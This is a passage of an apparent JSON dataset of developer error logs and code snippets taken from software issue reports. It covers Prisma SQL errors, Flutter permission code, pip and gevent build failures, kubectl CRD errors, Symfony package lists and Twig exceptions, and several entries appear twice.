        "logs": "[docker  ] prisma_1    | org.postgresql.util.PSQLException: ERROR: missing FROM-clause entry for table \"Deployment_Alias\"\r\n[docker  ] prisma_1    |   Position: 242\r\n[docker  ] prisma_1    | \tat org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2433)\r\n[Truncated]\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgStatement.execute(PgStatement.java:365)\r\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgPreparedStatement.executeWithFlags(PgPreparedStatement.java:155)\r\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgPreparedStatement.executeQuery(PgPreparedStatement.java:118)\r\n[docker  ] prisma_1    | \tat com.zaxxer.hikari.pool.ProxyPreparedStatement.executeQuery(ProxyPreparedStatement.java:52)\r\n[docker  ] prisma_1    | \tat com.zaxxer.hikari.pool.HikariProxyPreparedStatement.executeQuery(HikariProxyPreparedStatement.java)\r\n[docker  ] prisma_1    | \tat com.prisma.api.connector.jdbc.database.BuilderBase.$anonfun$queryToDBIO$1(BuilderBase.scala:52)\r\n[docker  ] prisma_1    | \tat com.prisma.api.connector.jdbc.database.BuilderBase.$anonfun$jooqToDBIO$1(BuilderBase.scala:82)\r\n[docker  ] prisma_1    | \tat slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70)\r\n[docker  ] prisma_1    | \tat slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69)\r\n[docker  ] prisma_1    | \tat slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275)\r\n[docker  ] prisma_1    | \tat slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275)\r\n[docker  ] prisma_1    | \tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\n[docker  ] prisma_1    | \tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\n[docker  ] prisma_1    | \tat java.lang.Thread.run(Thread.java:748)"
    },
    {
        "logs": "dart\r\nimport 'dart:async';\r\nimport 'dart:io';\r\n\r\nimport 'package:flutter/material.dart';\r\nimport 'package:simple_permissions/simple_permissions.dart';\r\n\r\nfinal Directory _photoDir = new Directory('/storage/emulated/0/DCIM/Camera');\r\n\r\nvoid main() => runApp(MyApp());\r\n\r\nclass MyApp extends StatelessWidget {\r\n  @override\r\n  Widget build(BuildContext context) {\r\n    return MaterialApp(home: Home());\r\n  }\r\n}\r\n\r\nclass Home extends StatefulWidget {\r\n\r\n  @override\r\n  HomeState createState() {\r\n    return new HomeState();\r\n  }\r\n}\r\n\r\nclass HomeState extends State<Home> {\r\n  Future<bool> _permissionCheck;\r\n\r\n  Future<bool> _checkPermission() {\r\n    return SimplePermissions.checkPermission(Permission.ReadExternalStorage);\r\n  }\r\n\r\n  Future<bool> _requestPemission() async {\r\n    return SimplePermissions.requestPermission(Permission.ReadExternalStorage);\r\n  }\r\n\r\n  @override\r\n  void initState() {\r\n    _permissionCheck = (() async {\r\n      bool hasPermission = await _checkPermission();\r\n      if (!hasPermission) {\r\n        hasPermission = await _requestPemission();\r\n      }\r\n      return hasPermission;\r\n    })();\r\n  }\r\n\r\n  @override\r\n  Widget build(BuildContext context) {\r\n    return Scaffold(\r\n      appBar: AppBar(),\r\n      body: FutureBuilder(\r\n        future: _permissionCheck,\r\n        builder: (context, status) {\r\n          if (status.connectionState == ConnectionState.done) {\r\n            if (status.data) {\r\n              print(\"Permission was granted\");\r\n              return ImageGrid(directory: _photoDir);\r\n            } else {\r\n              return Center(\r\n                child: Column(\r\n                  children: [\r\n                    Text(\"Read permission was denied, so can't read pictures. Try again by pressing below.\"),\r\n                    FlatButton(\r\n                      child: Text(\"Request Permission\"),\r\n                      onPressed: () {\r\n                        setState(() {\r\n                          _permissionCheck = _requestPemission();\r\n                        });\r\n                      },\r\n                    )\r\n                  ],\r\n                ),\r\n[Truncated]\n09-07 14:01:14.946 4741-8505/? W/InputDispatcher: Attempted to unregister already unregistered input channel '60c6d2c com.stackoverflow.username_0.imagepick/com.stackoverflow.username_0.imagepick.MainActivity (server)'\r\n09-07 14:01:14.946 4741-8506/? D/GraphicsStats: Buffer count: 2\r\n09-07 14:01:14.957 4741-8505/? W/WindowManager: Force-removing child win Window{5ae3192 u0 SurfaceView} from container Window{60c6d2c u0 com.stackoverflow.username_0.imagepick/com.stackoverflow.username_0.imagepick.MainActivity}\r\n09-07 14:01:15.022 371-371/? W/SurfaceFlinger: couldn't log to binary event log: overflow.\r\n09-07 14:01:15.041 4741-6529/? W/WindowManager: Failed looking up window\r\n    java.lang.IllegalArgumentException: Requested window android.os.BinderProxy@89613f5 does not exist\r\n        at com.android.server.wm.WindowManagerService.windowForClientLocked(WindowManagerService.java:8725)\r\n        at com.android.server.wm.WindowManagerService.windowForClientLocked(WindowManagerService.java:8716)\r\n        at com.android.server.wm.WindowState$DeathRecipient.binderDied(WindowState.java:1209)\r\n        at android.os.BinderProxy.sendDeathNotice(Binder.java:558)\r\n09-07 14:01:15.042 4741-6529/? I/WindowState: WIN DEATH: null"
    },
    {
        "logs": "[\u221a] Flutter (Channel dev, v0.8.2, on Microsoft Windows [Version 10.0.17134.254], locale en-GB)\r\n    \u2022 Flutter version 0.8.2 at C:\\VirtualDrives\\Programs\\flutter\r\n    \u2022 Framework revision 5ab9e70727 (4 days ago), 2018-09-07 12:33:05 -0700\r\n    \u2022 Engine revision 58a1894a1c\r\n    \u2022 Dart version 2.1.0-dev.3.1.flutter-760a9690c2\r\n\r\n[\u221a] Android toolchain - develop for Android devices (Android SDK 27.0.3)\r\n    \u2022 Android SDK at C:\\VirtualDrives\\Programs\\Android\\sdk\r\n    \u2022 Android NDK location not configured (optional; useful for native profiling support)\r\n    \u2022 Platform android-28, build-tools 27.0.3\r\n    \u2022 ANDROID_HOME = C:\\VirtualDrives\\Programs\\Android\\sdk\r\n    \u2022 Java binary at: C:\\Program Files\\Android\\Android Studio\\jre\\bin\\java\r\n    \u2022 Java version OpenJDK Runtime Environment (build 1.8.0_152-release-1024-b02)\r\n    \u2022 All Android licenses accepted.\r\n\r\n[\u221a] Android Studio (version 3.1)\r\n    \u2022 Android Studio at C:\\Program Files\\Android\\Android Studio\r\n    \u2022 Flutter plugin version 28.0.1\r\n    \u2022 Dart plugin version 173.4700\r\n    \u2022 Java version OpenJDK Runtime Environment (build 1.8.0_152-release-1024-b02)\r\n\r\n[\u221a] IntelliJ IDEA Community Edition (version 2018.2)\r\n    \u2022 IntelliJ at C:\\Program Files\\JetBrains\\IntelliJ IDEA Community Edition 2018.1\r\n    \u2022 Flutter plugin version 28.0.4\r\n    \u2022 Dart plugin version 182.4323.44\r\n\r\n[\u221a] VS Code, 32-bit edition\r\n    \u2022 VS Code at C:\\Program Files (x86)\\Microsoft VS Code\r\n    \u2022 Flutter extension version 2.12.2\r\n\r\n[\u221a] VS Code, 64-bit edition (version 1.26.1)\r\n    \u2022 VS Code at C:\\Program Files\\Microsoft VS Code\r\n    \u2022 Flutter extension version 2.12.2\r\n\r\n[\u221a] Connected devices (1 available)\r\n    \u2022 Nexus 5X \u2022 00c5937b0b2c37ce \u2022 android-arm64 \u2022 Android 6.0.1 (API 23)\r\n\r\n\u2022 No issues found!"
    },
    {
        "logs": "Widget _buildSuggestions(){\r\n    if(Platform.isAndroid){\r\n      return new FutureBuilder<Directory>(\r\n        future: getExternalStorageDirectory(),builder: _buildDirectory,\r\n      );\r\n    }\r\n    else{\r\n      return new Padding(\r\n          padding: const EdgeInsets.all(16.0),\r\n          child: new Text(\"You're not on Android\"));\r\n    }\r\n  }\r\n\r\n  Widget _buildDirectory(\r\n      BuildContext context, AsyncSnapshot<Directory> snapshot) {\r\n    Text text = const Text('');\r\n    if (snapshot.connectionState == ConnectionState.done) {\r\n      if (snapshot.hasError) {\r\n        text = new Text('Error: ${snapshot.error}');\r\n      } else if (snapshot.hasData) {\r\n        _dir = new Directory(snapshot.data.path + '/DCIM/Camera/');\r\n        text = new Text('path: ${_dir.path}');\r\n        _files = _dir.listSync(recursive: true, followLinks: false);\r\n      } else {\r\n        text = const Text('path unavailable');\r\n      }\r\n    }\r\n    if (null != _files) {\r\n      return new GridView.builder(\r\n          itemCount: _files.length,\r\n          gridDelegate: new SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 4, childAspectRatio: 4.0 / 3.0),\r\n          itemBuilder: (BuildContext context, int index){\r\n            return new Container(\r\n              padding: EdgeInsets.all(1.0),\r\n              child: new GestureDetector(\r\n                child: new Image.file(\r\n                    new File(_files.elementAt(index).path),\r\n                    scale: 1.0,\r\n                    repeat: ImageRepeat.noRepeat,\r\n                    fit: BoxFit.cover,\r\n                    matchTextDirection: true,\r\n                    gaplessPlayback: true,\r\n                  width: 100.0,\r\n                  height: 100.0,\r\n                ),\r\n                onTap: (){\r\n                  print(index);\r\n                  showLongToast(_files.elementAt(index).path);\r\n                },\r\n              ),\r\n            );\r\n          }\r\n      );\r\n    } else {\r\n      return new Padding(padding: const EdgeInsets.all(16.0), child: text);\r\n    }\r\n  }"
    },
    {
        "logs": "Describe any user facing changes here, or delete this block.\r\n\r\nExamples of user facing changes:\r\n- API changes\r\n- Bug fixes\r\n- Any changes in behavior"
    },
    {
        "logs": "Describe any user facing changes here, or delete this block.\r\n\r\nExamples of user facing changes:\r\n- API changes\r\n- Bug fixes\r\n- Any changes in behavior"
    },
    {
        "logs": " let queue = kue.createQueue(Object.assign(config.kue, { redis: config.redis }));\r\n        const job = queue.create('order', incomingOrder).save((err) => {\r\n          //err is always null\r\n          if (err) {\r\n            console.error(err)\r\n            apiError(res, err);\r\n          } else {\r\n            apiStatus(res, job.id, 200);\r\n          }\r\n })"
    },
    {
        "logs": " Running setup.py install for gevent ... error\r\n     Complete output from command /usr/bin/python3 -u -c \"import setuptools, tokenize;__file__='/tmp/pip-build-jj0s6svs/gevent/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\\r\\n', '\\n');f.close();exec(compile(code, __file__, 'exec'))\" install --record /tmp/pip-ivyvnjtq-record/install-record.txt --single-version-externally-managed --compile:\r\n     /usr/lib/python3.5/distutils/dist.py:261: UserWarning: Unknown distribution option: 'project_urls'"
    },
    {
        "logs": " Running setup.py install for gevent ... error\r\n     Complete output from command /usr/bin/python3 -u -c \"import setuptools, tokenize;__file__='/tmp/pip-build-jj0s6svs/gevent/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\\r\\n', '\\n');f.close();exec(compile(code, __file__, 'exec'))\" install --record /tmp/pip-ivyvnjtq-record/install-record.txt --single-version-externally-managed --compile:\r\n     /usr/lib/python3.5/distutils/dist.py:261: UserWarning: Unknown distribution option: 'project_urls'"
    },
    {
        "logs": "$ pip install SQLAlchemy==1.3.24\r\nInstalling collected packages: SQLAlchemy\r\n  Attempting uninstall: SQLAlchemy\r\n    Found existing installation: SQLAlchemy 1.4.18\r\n    Uninstalling SQLAlchemy-1.4.18:\r\n      Successfully uninstalled SQLAlchemy-1.4.18\r\nSuccessfully installed SQLAlchemy-1.3.24\r\n\r\n$ python mcve.py \r\n\r\nthis works\r\n13 [1, 2, 3]\r\n\r\nthis works also\r\n13\r\n\r\nthis works also. using the JSON type instead of sqlalchemy_utils.JSONType\r\n13 [1, 2, 3]\r\n\r\nbut this fails with TypeError: unhashable type: list. Problem comes from having AAA.json_column in the with_entities() clause, then iterating over the query:\r\n13 [1, 2, 3]"
    },
    {
        "logs": "$ pip install SQLAlchemy==1.3.24\r\nInstalling collected packages: SQLAlchemy\r\n  Attempting uninstall: SQLAlchemy\r\n    Found existing installation: SQLAlchemy 1.4.18\r\n    Uninstalling SQLAlchemy-1.4.18:\r\n      Successfully uninstalled SQLAlchemy-1.4.18\r\nSuccessfully installed SQLAlchemy-1.3.24\r\n\r\n$ python mcve.py \r\n\r\nthis works\r\n13 [1, 2, 3]\r\n\r\nthis works also\r\n13\r\n\r\nthis works also. using the JSON type instead of sqlalchemy_utils.JSONType\r\n13 [1, 2, 3]\r\n\r\nbut this fails with TypeError: unhashable type: list. Problem comes from having AAA.json_column in the with_entities() clause, then iterating over the query:\r\n13 [1, 2, 3]"
    },
    {
        "logs": "uvgRTP/include/socket.hh:163:28: error: field 'header_' has incomplete type 'uvgrtp::mmsghdr'\r\n  163 |             struct mmsghdr header_;"
    },
    {
        "logs": "uvgRTP/src/rtp.cc:198:48: warning: ISO C++11 requires at least one argument for the \"...\" in a variadic macro\r\n  198 |         LOG_DEBUG(\"frame contains csrc entries\");"
    },
    {
        "logs": "uvgRTP/include/socket.hh:163:28: error: field 'header_' has incomplete type 'uvgrtp::mmsghdr'\r\n  163 |             struct mmsghdr header_;"
    },
    {
        "logs": "Error: Could not retrieve catalog from remote server: Error 400 on SERVER: Evaluation Error: Error while evaluating a Resource Statement, Duplicate declaration: File[/var/lib/rundeck/.ssh/id_rsa] is already declared in file /etc/puppetlabs/code/environments/production/modules/rundeck/manifests/install.pp:102; cannot redeclare at /etc/puppetlabs/code/environments/production/modules/site_rundeck/manifests/init.pp:112 at /etc/puppetlabs/code/environments/production/modules/site_rundeck/manifests/init.pp:112:3 on node"
    },
    {
        "logs": "  Rendering\\UnknownSourceFileInfo.cs(42,16): warning CS0114: 'UnknownSourceFileInfo.GetHashCode()' hides inherited member 'object.GetHashCode()'. To make the current member override that implementation, add the override keyword. Otherwise add the new keyword. [C:\\Users\\Craig.Fowler\\Documents\\Visual Studio 2015\\Projects\\ZPT-Sharp\\CSF.Zpt\\CSF.Zpt.csproj]\r\n  Rendering\\UnknownSourceFileInfo.cs(59,17): warning CS0114: 'UnknownSourceFileInfo.Equals(object)' hides inherited member 'object.Equals(object)'. To make the current member override that implementation, add the override keyword. Otherwise add the new keyword. [C:\\Users\\Craig.Fowler\\Documents\\Visual Studio 2015\\Projects\\ZPT-Sharp\\CSF.Zpt\\CSF.Zpt.csproj]"
    },
    {
        "logs": "  Rendering\\UnknownSourceFileInfo.cs(42,16): warning CS0114: 'UnknownSourceFileInfo.GetHashCode()' hides inherited member 'object.GetHashCode()'. To make the current member override that implementation, add the override keyword. Otherwise add the new keyword. [C:\\Users\\Craig.Fowler\\Documents\\Visual Studio 2015\\Projects\\ZPT-Sharp\\CSF.Zpt\\CSF.Zpt.csproj]\r\n  Rendering\\UnknownSourceFileInfo.cs(59,17): warning CS0114: 'UnknownSourceFileInfo.Equals(object)' hides inherited member 'object.Equals(object)'. To make the current member override that implementation, add the override keyword. Otherwise add the new keyword. [C:\\Users\\Craig.Fowler\\Documents\\Visual Studio 2015\\Projects\\ZPT-Sharp\\CSF.Zpt\\CSF.Zpt.csproj]"
    },
    {
        "logs": "Failed to add/delete a test host on foobar.baz, check your DNS server configuration.\r\nThis is a requirement for setting the available flag. "
    },
    {
        "logs": "Failed to add/delete a test host on foobar.baz, check your DNS server configuration.\r\nThis is a requirement for setting the available flag. "
    },
    {
        "logs": "        [Composer\\Downloader\\TransportException]                                                                                                                                     \r\n        The \"http://packagist.org/p/provider-2018-01%24b6dfa015e80a095987bed2b513a1e030aa34d1f8e8b28899c95d7d89511f721b.json\" file could not be downloaded (HTTP/1.1 404 Not Found)  "
    },
    {
        "logs": "        [Composer\\Downloader\\TransportException]                                                                                                                                     \r\n        The \"http://packagist.org/p/provider-2018-01%24b6dfa015e80a095987bed2b513a1e030aa34d1f8e8b28899c95d7d89511f721b.json\" file could not be downloaded (HTTP/1.1 404 Not Found)  "
    },
    {
        "logs": "            \"The action that Connect should take on the connector when changes in external \" +\r\n            \"configuration providers result in a change in the connector's configuration properties. \" +\r\n            \"A value of 'none' indicates that Connect will do nothing. \" +\r\n            \"A value of 'restart' indicates that Connect should restart/reload the connector with the \" +\r\n            \"updated configuration properties.\" +\r\n            \"The restart may actually be scheduled in the future if the external configuration provider \" +\r\n            \"indicates that a configuration value will expire in the future.\";"
    },
    {
        "logs": "            \"The action that Connect should take on the connector when changes in external \" +\r\n            \"configuration providers result in a change in the connector's configuration properties. \" +\r\n            \"A value of 'none' indicates that Connect will do nothing. \" +\r\n            \"A value of 'restart' indicates that Connect should restart/reload the connector with the \" +\r\n            \"updated configuration properties.\" +\r\n            \"The restart may actually be scheduled in the future if the external configuration provider \" +\r\n            \"indicates that a configuration value will expire in the future.\";"
    },
    {
        "logs": "......\r\nchunk {3} main.5455f303c46ef36adeb1.js (main) 346 kB [initial] [rendered]\r\nTarget 'server' could not be found in project 'angular.io-example'.\r\nError: Target 'server' could not be found in project 'angular.io-example'.\r\n    at Architect._getProjectTarget (/Users/marvinheilemann/Downloads/toh-pt6/node_modules/@angular-devkit/architect/src/architect.js:90:19)\r\n    at Architect.getBuilderConfiguration (/Users/marvinheilemann/Downloads/toh-pt6/node_modules/@angular-devkit/architect/src/architect.js:97:29)\r\n    at MergeMapSubscriber._loadWorkspaceAndArchitect.pipe.operators_1.concatMap [as project] (/Users/marvinheilemann/Downloads/toh-pt6/node_modules/@angular/cli/models/architect-command.js:77:55)\r\n    at MergeMapSubscriber._tryNext (/Users/marvinheilemann/Downloads/toh-pt6/node_modules/rxjs/internal/operators/mergeMap.js:122:27)\r\n    at MergeMapSubscriber._next (/Users/marvinheilemann/Downloads/toh-pt6/node_modules/rxjs/internal/operators/mergeMap.js:112:18)\r\n    at MergeMapSubscriber.Subscriber.next (/Users/marvinheilemann/Downloads/toh-pt6/node_modules/rxjs/internal/Subscriber.js:103:18)\r\n    at TapSubscriber._next (/Users/marvinheilemann/Downloads/toh-pt6/node_modules/rxjs/internal/operators/tap.js:109:26)\r\n    at TapSubscriber.Subscriber.next (/Users/marvinheilemann/Downloads/toh-pt6/node_modules/rxjs/internal/Subscriber.js:103:18)\r\n    at MergeMapSubscriber.notifyNext (/Users/marvinheilemann/Downloads/toh-pt6/node_modules/rxjs/internal/operators/mergeMap.js:141:26)\r\n    at InnerSubscriber._next (/Users/marvinheilemann/Downloads/toh-pt6/node_modules/rxjs/internal/InnerSubscriber.js:30:21)\r\nnpm ERR! code ELIFECYCLE\r\nnpm ERR! errno 1\r\nnpm ERR! angular-io-example@1.0.0 build:client-and-server-bundles: "
    },
    {
        "logs": "$ kubectl create -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\ncustomresourcedefinition.apiextensions.k8s.io/jaegers.jaegertracing.io created\r\n$ kubectl create -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\nError from server (AlreadyExists): error when creating \"https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\": customresourcedefinitions.apiextensions.k8s.io \"jaegers.jaegertracing.io\" already exists"
    },
    {
        "logs": "$ kubectl apply -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\nThe CustomResourceDefinition \"jaegers.jaegertracing.io\" is invalid: metadata.annotations: Too long: must have at most 262144 characters"
    },
    {
        "logs": "$ kubectl create -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\ncustomresourcedefinition.apiextensions.k8s.io/jaegers.jaegertracing.io created\r\n$ kubectl create -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\nError from server (AlreadyExists): error when creating \"https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\": customresourcedefinitions.apiextensions.k8s.io \"jaegers.jaegertracing.io\" already exists"
    },
    {
        "logs": "$ kubectl apply -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\nThe CustomResourceDefinition \"jaegers.jaegertracing.io\" is invalid: metadata.annotations: Too long: must have at most 262144 characters"
    },
    {
        "logs": "dlp 0.1.0: building configuration \"dlp-test-application\"...\r\n--\r\n\u00a0 | Linking...\r\n\u00a0 | Running ./dlp-test-application\r\n\u00a0 | vendor/dmd/src/dmd/gluelayer.d(47): [unittest] Assertion failure\r\n\u00a0 | core.exception.AssertError@vendor/dmd/src/dmd/gluelayer.d(47): Assertion failure"
    },
    {
        "logs": "If the certificate issuer is not the CRL issuer, then the cRLIssuer field MUST be \r\npresent and contain the Name of the CRL issuer.  If the certificate issuer is also \r\nthe CRL issuer, then conforming CAs MUST omit the cRLIssuer field and MUST \r\ninclude the distributionPoint field"
    },
    {
        "logs": "If the certificate issuer is not the CRL issuer, then the cRLIssuer field MUST be \r\npresent and contain the Name of the CRL issuer.  If the certificate issuer is also \r\nthe CRL issuer, then conforming CAs MUST omit the cRLIssuer field and MUST \r\ninclude the distributionPoint field"
    },
    {
        "logs": "sonata-project/admin-bundle              3.78.1 3.78.1 The missing Symfony Admin Generator\r\nsonata-project/block-bundle              4.4.0  4.4.0  Symfony SonataBlockBundle\r\nsonata-project/cache                     2.0.1  2.0.1  Cache library\r\nsonata-project/doctrine-extensions       1.10.1 1.10.1 Doctrine2 behavioral extensions\r\nsonata-project/doctrine-orm-admin-bundle 3.24.0 3.24.0 Integrate Doctrine ORM into the SonataAdminBundle\r\nsonata-project/exporter                  2.4.1  2.4.1  Lightweight Exporter library\r\nsonata-project/form-extensions           1.6.0  1.6.0  Symfony form extensions\r\nsonata-project/twig-extensions           1.4.1  1.4.1  Sonata twig extensions"
    },
    {
        "logs": "symfony/asset                      v4.4.16 v4.4.16 Symfony Asset Component\r\nsymfony/cache                      v4.4.16 v4.4.16 Symfony Cache component with PSR-6, PSR-16, and tags\r\nsymfony/cache-contracts            v2.2.0  v2.2.0  Generic abstractions related to caching\r\nsymfony/config                     v4.4.16 v4.4.16 Symfony Config Component\r\nsymfony/console                    v4.4.16 v4.4.16 Symfony Console Component\r\nsymfony/debug                      v4.4.16 v4.4.16 Symfony Debug Component\r\nsymfony/debug-bundle               v4.4.16 v4.4.16 Symfony DebugBundle\r\nsymfony/dependency-injection       v4.4.16 v4.4.16 Symfony DependencyInjection Component\r\nsymfony/doctrine-bridge            v4.4.16 v4.4.16 Symfony Doctrine Bridge\r\nsymfony/dotenv                     v4.4.16 v4.4.16 Registers environment variables from a .env file\r\nsymfony/error-handler              v4.4.16 v4.4.16 Symfony ErrorHandler Component\r\nsymfony/event-dispatcher           v4.4.16 v4.4.16 Symfony EventDispatcher Component\r\nsymfony/event-dispatcher-contracts v1.1.9  v2.2.0  Generic abstractions related to dispatching event\r\nsymfony/expression-language        v4.4.16 v4.4.16 Symfony ExpressionLanguage Component\r\nsymfony/filesystem                 v4.4.16 v4.4.16 Symfony Filesystem Component\r\nsymfony/finder                     v4.4.16 v4.4.16 Symfony Finder Component\r\nsymfony/flex                       v1.9.10 v1.9.10 Composer plugin for Symfony\r\nsymfony/form                       v4.4.16 v4.4.16 Symfony Form Component\r\nsymfony/framework-bundle           v4.4.16 v4.4.16 Symfony FrameworkBundle\r\nsymfony/http-client-contracts      v2.3.1  v2.3.1  Generic abstractions related to HTTP clients\r\nsymfony/http-foundation            v4.4.16 v4.4.16 Symfony HttpFoundation Component\r\nsymfony/http-kernel                v4.4.16 v4.4.16 Symfony HttpKernel Component\r\nsymfony/inflector                  v4.4.16 v4.4.16 Symfony Inflector Component\r\nsymfony/intl                       v4.4.16 v4.4.16 A PHP replacement layer for the C intl extension that includes additional data from the ICU library.\r\nsymfony/maker-bundle               v1.23.0 v1.23.0 Symfony Maker helps you create empty commands, controllers, form classes, tests and more so you can forget about writing boilerplate code.\r\nsymfony/mime                       v4.4.16 v4.4.16 A library to manipulate MIME messages\r\nsymfony/monolog-bridge             v4.4.16 v4.4.16 Symfony Monolog Bridge\r\nsymfony/monolog-bundle             v3.6.0  v3.6.0  Symfony MonologBundle\r\nsymfony/options-resolver           v4.4.16 v4.4.16 Symfony OptionsResolver Component\r\nsymfony/polyfill-intl-grapheme     v1.20.0 v1.20.0 Symfony polyfill for intl's grapheme_* functions\r\nsymfony/polyfill-intl-icu          v1.20.0 v1.20.0 Symfony polyfill for intl's ICU-related data and classes\r\nsymfony/polyfill-intl-idn          v1.20.0 v1.20.0 Symfony polyfill for intl's idn_to_ascii and idn_to_utf8 functions\r\nsymfony/polyfill-intl-normalizer   v1.20.0 v1.20.0 Symfony polyfill for intl's Normalizer class and related functions\r\nsymfony/polyfill-mbstring          v1.20.0 v1.20.0 Symfony polyfill for the Mbstring extension\r\nsymfony/polyfill-php72             v1.20.0 v1.20.0 Symfony polyfill backporting some PHP 7.2+ features to lower PHP versions\r\nsymfony/polyfill-php73             v1.20.0 v1.20.0 Symfony polyfill backporting some PHP 7.3+ features to lower PHP versions\r\nsymfony/polyfill-php80             v1.20.0 v1.20.0 Symfony polyfill backporting some PHP 8.0+ features to lower PHP versions\r\nsymfony/property-access            v4.4.16 v4.4.16 Symfony PropertyAccess Component\r\nsymfony/routing                    v4.4.16 v4.4.16 Symfony Routing Component\r\nsymfony/security-acl               v3.1.0  v3.1.0  Symfony Security Component - ACL (Access Control List)\r\nsymfony/security-bundle            v4.4.16 v4.4.16 Symfony SecurityBundle\r\nsymfony/security-core              v4.4.16 v4.4.16 Symfony Security Component - Core Library\r\nsymfony/security-csrf              v4.4.16 v4.4.16 Symfony Security Component - CSRF Library\r\nsymfony/security-guard             v4.4.16 v4.4.16 Symfony Security Component - Guard\r\nsymfony/security-http              v4.4.16 v4.4.16 Symfony Security Component - HTTP Integration\r\nsymfony/service-contracts          v2.2.0  v2.2.0  Generic abstractions related to writing services\r\nsymfony/stopwatch                  v4.4.16 v4.4.16 Symfony Stopwatch Component\r\nsymfony/string                     v5.1.8  v5.1.8  Symfony String component\r\nsymfony/translation                v4.4.16 v4.4.16 Symfony Translation Component\r\nsymfony/translation-contracts      v2.3.0  v2.3.0  Generic abstractions related to translation\r\nsymfony/twig-bridge                v4.4.16 v4.4.16 Symfony Twig Bridge\r\nsymfony/twig-bundle                v4.4.16 v4.4.16 Symfony TwigBundle\r\nsymfony/validator                  v4.4.16 v4.4.16 Symfony Validator Component\r\nsymfony/var-dumper                 v4.4.16 v4.4.16 Symfony mechanism for exploring and dumping PHP variables\r\nsymfony/var-exporter               v4.4.16 v4.4.16 A blend of var_export() + serialize() to turn any serializable data structure to plain PHP code\r\nsymfony/web-profiler-bundle        v4.4.16 v4.4.16 Symfony WebProfilerBundle\r\nsymfony/yaml                       v4.4.16 v4.4.16 Symfony Yaml Component"
    },
    {
        "logs": "sonata-project/admin-bundle              3.78.1 3.78.1 The missing Symfony Admin Generator\r\nsonata-project/block-bundle              4.4.0  4.4.0  Symfony SonataBlockBundle\r\nsonata-project/cache                     2.0.1  2.0.1  Cache library\r\nsonata-project/doctrine-extensions       1.10.1 1.10.1 Doctrine2 behavioral extensions\r\nsonata-project/doctrine-orm-admin-bundle 3.24.0 3.24.0 Integrate Doctrine ORM into the SonataAdminBundle\r\nsonata-project/exporter                  2.4.1  2.4.1  Lightweight Exporter library\r\nsonata-project/form-extensions           1.6.0  1.6.0  Symfony form extensions\r\nsonata-project/twig-extensions           1.4.1  1.4.1  Sonata twig extensions"
    },
    {
        "logs": " Uncaught PHP Exception Twig_Error_Runtime: \"An exception has been thrown during the rendering of a template (\"The Symfony\\Component\\Intl\\NumberFormatter\\NumberFormatter::__construct() method's argument $style value 0 behavior is not i\r\nmplemented. The available styles are: CURRENCY, DECIMAL..  Please install the \"intl\" extension for full localization capabilities.\") in \"AppBundle::bandwidth_usage.html.twig\" at line 14.\" at /var/www/project/vendor/twig/twig/lib/Twig/Template.php line 182 {\"exception\":\"[obj\r\nect] (Twig_Error_Runtime(code: 0): An exception has been thrown during the rendering of a template (\\\"The Symfony\\\\Component\\\\Intl\\\\NumberFormatter\\\\NumberFormatter::__construct() method's argument $style value 0 behavior is not implemented. The available styles are: CURREN\r\nCY, DECIMAL..  Please install the \\\"intl\\\" extension for full localization capabilities.\\\") in \\\"AppBundle::bandwidth_usage.html.twig\\\" at line 14. at /var/www/project/vendor/twig/twig/lib/Twig/Template.php:182, Symfony\\\\Component\\\\Intl\\\\Exception\\\\MethodArgumentValueNotImp\r\nlementedException(code: 0): The Symfony\\\\Component\\\\Intl\\\\NumberFormatter\\\\NumberFormatter::__construct() method's argument $style value 0 behavior is not implemented. The available styles are: CURRENCY, DECIMAL..  Please install the \\\"intl\\\" extension for full localization\r\n capabilities. at /var/www/project/vendor/symfony/symfony/src/Symfony/Component/Intl/NumberFormatter/NumberFormatter.php:292)\"} []"
    },
    {
        "logs": " Uncaught PHP Exception Twig_Error_Runtime: \"An exception has been thrown during the rendering of a template (\"The Symfony\\Component\\Intl\\NumberFormatter\\NumberFormatter::__construct() method's argument $style value 0 behavior is not i\r\nmplemented. The available styles are: CURRENCY, DECIMAL..  Please install the \"intl\" extension for full localization capabilities.\") in \"AppBundle::bandwidth_usage.html.twig\" at line 14.\" at /var/www/project/vendor/twig/twig/lib/Twig/Template.php line 182 {\"exception\":\"[obj\r\nect] (Twig_Error_Runtime(code: 0): An exception has been thrown during the rendering of a template (\\\"The Symfony\\\\Component\\\\Intl\\\\NumberFormatter\\\\NumberFormatter::__construct() method's argument $style value 0 behavior is not implemented. The available styles are: CURREN\r\nCY, DECIMAL..  Please install the \\\"intl\\\" extension for full localization capabilities.\\\") in \\\"AppBundle::bandwidth_usage.html.twig\\\" at line 14. at /var/www/project/vendor/twig/twig/lib/Twig/Template.php:182, Symfony\\\\Component\\\\Intl\\\\Exception\\\\MethodArgumentValueNotImp\r\nlementedException(code: 0): The 